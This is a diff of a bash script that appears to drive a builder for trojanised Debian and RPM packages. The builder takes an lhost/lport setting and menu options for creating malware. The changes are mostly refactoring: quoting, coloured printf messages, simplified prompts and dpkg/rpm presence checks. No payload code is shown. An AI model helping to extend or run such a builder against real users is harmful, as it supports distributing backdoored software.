@@ -27,19 +27,19 @@
 ##
 #############################################################################
 ################################     VARIABLES	 ############################
-source ${PWD}/misc/globals.sh
-source ${PWD}/misc/utils.sh    
-source ${PWD}/misc/malware.sh
+source "${PWD}/misc/globals.sh"
+source "${PWD}/misc/utils.sh"
+source "${PWD}/misc/malware.sh"
 
 
-source ${PWD}/misc/fromPackage.sh
-source ${PWD}/misc/debpackage.sh
-source ${PWD}/misc/rpmpackage.sh
-source ${PWD}/misc/petpackage.sh
-source ${PWD}/misc/pkgpackage.sh
+source "${PWD}/misc/fromPackage.sh"
+source "${PWD}/misc/debpackage.sh"
+source "${PWD}/misc/rpmpackage.sh"
+source "${PWD}/misc/petpackage.sh"
+source "${PWD}/misc/pkgpackage.sh"
 
 
-[ ! -o xpg_echo ] && shopt -s xpg_echo
+#[ ! -o xpg_echo ] && shopt -s xpg_echo
 
 [[ -d './malware/' ]] && rm -rf ./malware/
 
@@ -48,7 +48,7 @@ source ${PWD}/misc/pkgpackage.sh
 #####IF USER IS ROOT RUN THIS SCRIPT, IF USER IS NOT EXIT THE SCRIPT
 is_root() {
     [[ $UID != 0 ]] && {
-	echo "You are just an ordinary user (but mom loves you just the same)."
+	printf "You are just an ordinary user (but mom loves you just the same).\n"
 	exit 1
     }
 }
@@ -193,14 +193,14 @@ chk_file() {
 	    
 	    envl='#!'"$(which env)" # this will produce #!/usr/bin/env
 	    
-	    declare -a bangArray=("$(which bash)" "$(which dash)" "$(which ksh)" "$(which sh)" "$(which rbash)" "$(which tmux)" "$(which tcsh)" "$(which perl)" "$(which python)" "$(which tclsh)" )
+	    declare -a bangArray=("$(which bash)" "$(which dash)" "$(which ksh)" "$(which sh)" "$(which rbash)" "$(which perl)" "$(which python)" )
 	    
 	    
 	    
 	    for i in "${bangArray[@]}"
 	    do
 		#echo "#!${i}" > /dev/null 2>&1
-
+		# check if the first line of the script is a hash bank
 		head -1 "${bindscript}" | egrep -q "#\!$i|$envl\s+${i##*/}" #>/dev/null 2>&1
 		if [[ $? == 0 ]];then
 		    dirfile=${bindscript}
@@ -250,20 +250,20 @@ replay(){
 }
 set_opt(){
     if [[ "$l_set" != "set" ]];then
-	echo "Invalid Command"
+	printf "${open}${bold}${red}Invalid Command${close}\n"
 	set_usage
 	return 1
     fi
 
     if [[ -z "$l_host" ]];then
 
-	echo "No arguemnt was passed to set"
+	printf "${open}${bold}${red}No arguemnt was passed to set${close}\n"
 	set_usage
 	return 1
 
     elif [[ "$l_host" != "lhost_lport" ]];then
 
-	echo "Invalid set argument"
+	printf "${open}${bold}${red}Invalid set argument${close}\n"
 	set_usage
 	return 1
 
@@ -278,7 +278,7 @@ general(){
 
 	
 	if [[ -z "$l_ip" ]] || [[ -z "$l_port" ]];then
-	    printf "incomplete options" && set_usage && continue   
+	    printf "${open}${bold}${red}Incomplete options${close}\n" && set_usage && continue   
 	fi
 
 	isInteger "$l_port"
@@ -300,34 +300,29 @@ packagedetails(){
     printf "\n${open}${light}${green}The Below details are needed for packaging the %s file${close}\n" \
 	   "${pPackage}"
 
-    
-    while :;do
-       read -ep "Email Address: [dev@devloper.com]: " email
-       if [[ -z "$email" ]];then
-	   email="dev@developer.com"
-	   break ;
-       fi
-    done
-    
-    while :;do
+    {
+	
+	read -ep "Email Address: [dev@devloper.com]: " email
+	
+	if [[ -z "$email" ]];then
+	    email="dev@developer.com"
+	fi
+	
+	
 	read -ep "Enter Description: [incredible application]: " description
 	if [[ -z "$description" ]];then
 	    description="incredible application"
-	    break
+	    
 	fi
-    done
+	
 
-    while :;do
 	read -ep "Enter Version Number: [0.1]: " vnumber
-	echo ""
 	if [[ -z "$vnumber" ]];then
 	    vnumber="0.1"
-	    break
 	fi
-    done
+    }
     
-    printf "\n"
-    printf "[!]Email: %s\n" "$email"
+    printf "\n[!]Email: %s\n" "$email"
     printf "[!]Description: %s\n" "$description"
     printf "[!]VersionNumber: %s${close}\n\n" "$vnumber"
 
@@ -342,14 +337,30 @@ createserver(){
     do
 	printf "\n"
 	case $cserversel in
-	    1) 
+	    1)
+		which dpkg &>/dev/null
+		status=$?
+		(( status != 0 )) && {
+		    printf "[!]${open}${bold}${yellow}dpkg not found${close}\n"
+		    printf "[!]${open}${bold}${yellow}Cannot create a malware for debian linux${close}\n"
+		    continue;
+		}
 		hungerGames="$cserversel"
 		pPackage="debian"
 		cservprompt="${PS2}:create_server:debian_base"
 		general
 
 		;;
-	    2) 
+	    2)
+		
+		which rpm &>/dev/null
+		status=$?
+		(( status != 0 )) && {
+		    printf "[!]${open}${bold}${yellow}rpm not found${close}\n"
+		    printf "[!]${open}${bold}${yellow}Cannot create a malware for debian linux${close}\n"
+		    continue;
+		}
+	       	
 		hungerGames="$cserversel"
 		pPackage="rpm"
 		cservprompt="${PS2}:create_server:rpm_base"
@@ -393,12 +404,11 @@ createserver(){
 		reset && _select && break ;;
 	    q) exit ;;
 	    *) 	createserver_banner
-		echo ""
-		printf "${open}${light}${yellow}[!]Invalid Selection <%s>${close}\n" "$cserversel" ;;
+		
+		printf "\n${open}${light}${yellow}[!]Invalid Selection <%s>${close}\n" "$cserversel" ;;
 	esac
     done
 }
-#
 is_root
 header
 _select
